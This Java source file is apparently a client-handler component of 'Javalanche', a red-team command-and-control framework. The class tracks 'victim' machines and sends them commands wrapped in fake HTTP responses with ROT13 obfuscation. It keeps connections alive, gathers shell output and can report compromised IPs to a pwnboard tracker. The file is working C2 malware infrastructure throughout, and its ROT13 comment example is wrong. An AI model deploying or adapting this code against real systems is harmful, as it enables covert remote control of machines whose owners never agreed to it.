package Servers.Beacon;

import Servers.Duplexer;
import Servers.keepAlive;

import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.Scanner;

public class BeaconClientHandler implements Runnable{
    // IP address of the client
    private String IPAddress;

    // Pointer to the duplexer that is used to send/receive with client
    private Duplexer duplexer;

    // Pointer back to the Beacon Server that is associated with this client
    private BeaconServer beaconServer;

    // Operating System of the client
    private String os;

    // Sentinel = true when this client is still active, when the client connection is lost Sentinel = false
    private Boolean sentinel = true;

    // Class and thread that is used to send KEEP_ALIVE messages to the client to keep the connection alive
    private keepAlive keepAliveClass;
    private Thread keepAliveThread;

    // Object lock used to make sure that this thread is able to safetly access the duplexer
    private Object sendLock;

    // Boolean to determine whether or not this client is currently in a shell, or commands are just being distributed to many clients
    private Boolean isShell = false;

    // Object Lock used for notifying when messages have been received when the client is currently being used as a shell
    private Object shellLock;

    // Variables used to send HTTP Requests to pwnboard. pwnboard is used to keep track of what machines red team still has access to.
    URI pwnboardUri = null;
    URL pwnboardUrl = null;
    HttpURLConnection pwnboardConnection = null;
    String pwnboardData;

    /**
     * Use this Class to create a new thread to handle each victim connection
     * 
     * @param IPAddress IP address of the client (victim)
     * @param duplexer Pointer to the duplexer so that this thread can receive messages from the client
     * @param beaconServer Pointer to the Becon Server that this client is associated with
     * @param os Operating System of this client
     */
    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String os, Object shellLock){
        this.IPAddress = IPAddress;
        this.duplexer = duplexer;
        this.beaconServer = beaconServer;
        this.os = os;
        this.sendLock = new Object();
        this.keepAliveClass = new keepAlive(this.duplexer, sendLock, true, true);
        this.keepAliveThread = new Thread(keepAliveClass);
        this.shellLock = shellLock;

        try{
            this.pwnboardUri = new URI("https://pwnboard.win/pwn/boxaccess");
            this.pwnboardUrl = this.pwnboardUri.toURL();
        } catch (URISyntaxException e){
            e.printStackTrace();
        } catch (MalformedURLException e){
            e.printStackTrace();
        }
        this.pwnboardData = "{\"ip\": \"" + IPAddress + "\", \"application\": \"Javalanche\", \"access_type\": \"beacon\"}";
    }

    protected void quit(String reason) throws IOException{
        duplexer.close();
    }

    protected void setIsShell(Boolean value){
        this.isShell = value;
    }

    /**
     * Encrypts/Decrypts the plain text with a simple rot13 cipher - Shifts each letter by 13 spots.
     * (ex. A --> B, E --> R, Y --> L)
     * 
     * Because each letter is just shifted by 13 characters, encrypting/decrypting are the same algorithm
     * 
     * @param plaintext - The text to be shifted
     * @return - The new encrypted/decrypted text
     */
    private String encrypt(String plaintext) {
        StringBuilder encryptedText = new StringBuilder();

        for (char character : plaintext.toCharArray()) {
            if (character >= 'a' && character <= 'z') {
                encryptedText.append((char) ('a' + (character - 'a' + 13) % 26));
            } else if (character >= 'A' && character <= 'Z') {
                encryptedText.append((char) ('A' + (character - 'A' + 13) % 26));
            } else {
                encryptedText.append(character);
            }
        }
        return encryptedText.toString();
    }

    /**
     * This method sends a HTTP request to pwnbaord. pwnboard keeps track of what machines we have access to in the competition, so this method is called
     * Whenever a message is received from the client
     */
    private void sendPwnBoardRequest() throws IOException{
        // Connect to pwnboard
        pwnboardConnection = (HttpURLConnection)pwnboardUrl.openConnection();
        pwnboardConnection.setDoOutput(true);
        pwnboardConnection.connect();

        // Send api request
        DataOutputStream writer = new DataOutputStream(pwnboardConnection.getOutputStream());
        
        writer.writeBytes(pwnboardData);
        writer.close();

        // Debug lines
        InputStream in = pwnboardConnection.getInputStream();
        Scanner scanner = new Scanner(in);

        while(scanner.hasNext()){
            scanner.nextLine();
        }
        scanner.close();

        pwnboardConnection.disconnect();

    }

    /**
     * Use this function to have the thread send a message to the client
     * 
     * @param message Message to be sent
     */
    protected void sendToClient(String message){
        if(sentinel){
            message = encrypt(message);
            String httpHeader = "HTTP/1.1 200 OK\r\n" +  "Content-Length: " + message.length() + "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
            message = httpHeader + message;
            synchronized(sendLock){
                duplexer.send(message);
            }
        }
    }

    @Override
    public void run(){
        // Start the Thread to Send KEEP_ALIVE messages to the client every 30 seconds
        keepAliveThread.start();
        Boolean notify;
        while(sentinel){
            try{
                notify = false;
                String response = duplexer.receive();
                // If sending pwnboard requests fail, this isn't really critical to javalanche's connection to the client,
                // so we don't want to stop the main while loop, so this smaller try catch block is just for catching 
                // exceptions related to sending pwnboard
                // try {
                //     sendPwnBoardRequest();
                // } catch (IOException e){
                //     System.out.println(IPAddress + " unable to update PWNBoard");
                // }
                if(response != null){
                    if(!(response.equals("GET / HTTP/1.1")) && !(response.contains("Content-Length")) && !(response.equals("Content-Type: text/plain; charset=utf-8")) && !(response.equals("HTTP/1.1 200 OK")) && !(response.isBlank())){
                        response = encrypt(response);
                        if(!(response.equals("KEEP_ALIVE"))){
                            System.out.println("Received: " + response);
                            // Remove the END_OF_OUTPUT part of the end of the response to the command
                            if(response.contains(("END_OF_OUTPUT"))){
                                response = response.substring(0, response.indexOf("END_OF_OUTPUT"));
                                notify = true;
                            }
                            beaconServer.addDataToResponsesDictionaries(IPAddress, response);

                            // If this client is currently being used as a shell, notify the lock so that the server knows
                            // to return the responses immediately
                            if(isShell && notify){
                                synchronized(shellLock){
                                    shellLock.notify();
                                }
                            }
                        }
                    }
                }
            } catch (IOException e){
                sentinel = false;
                try{
                    duplexer.close();
                    keepAliveClass.stopKeepAlive();
                } catch (IOException d){
                    d.printStackTrace();
                }
                beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
                beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
                e.printStackTrace();
            } catch (java.lang.NullPointerException e){
                sentinel = false;
                try{
                    duplexer.close();
                } catch (IOException d){
                    d.printStackTrace();
                }
                beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
                beaconServer.addDataToResponsesDictionaries(IPAddress, "DISCONNECTED");
                e.printStackTrace();
            }
        }
    }
}